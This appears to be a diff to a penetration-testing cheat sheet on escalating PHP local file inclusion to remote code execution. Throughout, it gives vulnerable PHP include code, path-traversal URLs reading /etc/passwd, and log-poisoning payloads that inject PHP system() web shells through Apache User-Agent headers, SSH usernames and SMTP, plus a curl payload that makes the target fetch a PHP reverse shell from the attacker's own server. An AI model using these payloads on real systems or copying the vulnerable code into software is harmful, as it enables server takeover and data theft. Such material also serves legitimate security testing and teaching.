@@ -3,6 +3,7 @@ Transition form local file inclusion attacks to remote code exection
 
 # Vulnerable PHP Code (LFI) 1
 
+Basic unsecure code
 ```
 <?php
 $file = $_GET['file'];
@@ -17,6 +18,7 @@ Example URL: http//10.10.10.10/index.php?file=../../../../../../../etc/passwd
 
 # Vulnerable PHP Code (LFI) 2
 
+Basic unsecure code
 ```
 <?php
    $file = $_GET['file'];
@@ -32,6 +34,23 @@ Example URL: http//10.10.10.10/index.php?file=../../../../../../../etc/passwd
 
 
 Example URL: http//10.10.10.10/index.php?file=../../../../../../../etc/passwd
+    
+```
+
+# Secure PHP Code (LFI) 
+
+Secure code - More secure than above , but still expliotable
+```
+<?php
+
+if(isset($_GET['file']))
+{
+        $file=str_replace('../','',$_GET['file']);
+        $file=str_replace('./','',$file);
+        echo @file_get_contents('./'.$file);
+}
+
+?>
     
 ```
 
@@ -78,17 +97,27 @@ print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|
 # LFI to RCE via Apache Log File Poisoning (PHP)
 
 ```
-Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log // Must have the ability to read the log file 
+Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log 
 
-Payload: curl "http://192.168.8.108/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>" // Replace IP with your target 
+// Must have the ability to read the log file 
+
+Payload: curl "http://192.168.8.108/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>" 
+
+// Replace IP with your target 
+
 Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log&cmd=id
 
 OR
-python -m SimpleHTTPServer 9000 // You can use any port
-Payload: curl "http://<remote_ip>/" -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<local_ip>:9000/shell-php-rev.php')) ?>" // This will download the PHP reverse shell from your web server onto the target
+python -m SimpleHTTPServer 9000 
 
-// file_put_contents('shell.php') = What it will be saved locally on the target
-// file_get_contents('http://<local_ip>:9000/shell-php-rev.php') = Where is the shell on YOUR pc and WHAT is it called
+// You can use any port
+
+Payload: curl "http://<remote_ip>/" -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<local_ip>:9000/shell-php-rev.php')) ?>" 
+
+// This will download the PHP reverse shell from your web server onto the target
+
+file_put_contents('shell.php')                                // What it will be saved locally on the target
+file_get_contents('http://<local_ip>:9000/shell-php-rev.php') // Where is the shell on YOUR pc and WHAT is it called
 
 Execute PHP Reverse Shell: http//10.10.10.10/shell.php
 ```
@@ -96,8 +125,13 @@ Execute PHP Reverse Shell: http//10.10.10.10/shell.php
 # LFI to RCE via SSH Log File Poisoning (PHP)
 
 ```
-Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log // Must have the ability to read the log file
-Payload: ssh <?php system($_GET['cmd']);?>@<target_ip> // Replace with the target IP
+Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log 
+
+// Must have the ability to read the log file
+
+Payload: ssh <?php system($_GET['cmd']);?>@<target_ip>
+
+// Replace with the target IP
 
 Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log&cmd=id
 
@@ -106,7 +140,9 @@ Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.
 # LFI to RCE via SMTP Log File Poisoning (PHP)
 
 ```
-Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log // Must have the ability to read the log file
+Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log 
+
+// Must have the ability to read the log file
 
 telnet <target_ip> 25 // Replace with the target IP
 MAIL FROM:<toor@gmail.com>
